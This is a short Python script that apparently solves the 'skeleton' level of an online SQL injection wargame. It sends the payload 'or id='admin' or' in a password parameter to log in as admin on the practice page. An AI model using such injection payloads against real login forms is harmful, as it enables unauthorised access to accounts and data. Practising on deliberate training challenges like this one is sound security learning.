import requests
from settings import session_id
from bs4_utils import print_html

url = "https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php"
cookies = {'PHPSESSID': session_id}

params = {
    'pw': "'or id='admin' or'"
}
response = requests.get(url, params=params, cookies=cookies)
print_html(response.text)
